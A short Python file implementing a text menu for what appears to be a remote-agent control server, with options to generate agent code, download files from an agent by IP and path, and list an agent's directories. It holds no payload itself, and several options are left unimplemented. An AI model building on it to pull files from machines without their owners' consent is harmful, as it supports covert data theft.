from rich.console import Console
from rich.table import Table
from rich.theme import Theme

import Gateways.CybServerGateway as cybServerGateway


custom_theme = Theme({
    "success": "green",
    "info": "deep_sky_blue1",
    "error": "bold red"
})
console = Console(theme=custom_theme)

options_rows = ['Generate code for agent', 'Download file from agent', 'List agent\'s files from directory',
                'List agents', 'Close agent connection', 'Exit']


def menu():
    table = Table()
    table.add_column("S. No.", style="cyan", no_wrap=True)
    table.add_column("Options", style="magenta")

    i = 1
    for option in options_rows:
        table.add_row(str(i), option)
        i = i + 1

    console.print(table)
    value = input()
    if value == '1':
        generate_code_for_agent()
    if value == '2':
        download_file_from_agent()
    if value == '3':
        list_agent_files()
    else:
        menu()


def generate_code_for_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input()
    code = cybServerGateway.generate_first_code_for_agent(cybServerGateway.GenerateFirstCodeForAgentInputType(
        ip_address=ip_address))
    menu()


def download_file_from_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input()
    console.print("Insert agent's file path", style="info")
    file_path = input()
    cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
        ip_address=ip_address, file_path=file_path))
    menu()


def list_agent_files():
    console.print("Insert agent's ip address", style="info")
    ip_address = input()
    console.print("Insert agent's directory path", style="info")
    dir_path = input()
    cybServerGateway.list_files_from_agent(cybServerGateway.ListFilesFromAgentInputType(
        ip_address=ip_address, dir_path=dir_path))
    menu()
